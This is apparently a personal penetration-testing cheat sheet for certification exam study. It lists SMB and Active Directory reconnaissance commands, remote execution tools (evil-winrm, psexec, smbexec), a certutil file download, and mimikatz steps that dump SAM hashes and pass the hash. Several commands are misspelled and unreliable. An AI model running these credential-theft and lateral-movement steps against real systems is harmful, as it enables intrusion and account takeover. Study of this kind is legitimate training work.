Markdown語法：https://hackmd.io/@eMP9zQQ0Qt6I8Uqp2Vqy6w/SyiOheL5N/%2FBVqowKshRH246Q7UDyodFA  
https://blog.stevenyu.tw/2022/06/10/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90-cpent-%E8%80%83%E8%A9%A6%E5%BF%83%E5%BE%97%E3%80%81%E4%BB%A5%E5%8F%8A%E8%88%87-oscp-%E7%9A%84%E6%AF%94%E8%BC%83/  
## NMAP Reacon  
nmap -sS -n -p 445 --script smb-protocls 192.168.1.1 

## AD Reacon  
# Windows  
nbtstat -A (IP)  
adreacon  
# Linux  
enum4linux-ng -A  

## Reacon SMB  
net view \\192.168.1.1  
dir \\192.168.1.1  
smbclient -L //IP -U DC_name\\acount  
nmap -n -sS -p137,138,139,448 --script smb-os-discovery 192.168.1.1  
nmap -sS -n -p 445 --script smb-protocls 192.168.1.1  

## Use SMB 
smbclient -L //IP -U DC_name\\acount  
smbclient //IP/<Folder> -U DC_name\\account  
smbclient //192.168.1.1/C$ -U DC_name\\account  

## Download File 
certutil -urlcache -split -f <URL> <輸出檔名>  

## Windows Remote  
# WinRM  
evil-winrm  
# RDP  
xfreerdp3 
# psexec  
impacket-psexec  
psexec \\192.168.1.1: cmd.exe  
# smbexec  
impacket-smbexec  

# mimikatz  
privilege::debug  
tocke::elevate  
lsadump::sam  
sekurlsa::pth /user:administrator /domain:. /ntlm:<ntlm hash>  

## GDB 
# Install Plgu-in  
# Commands  
gdb bash
b main
run 
info registers
disassemble main  

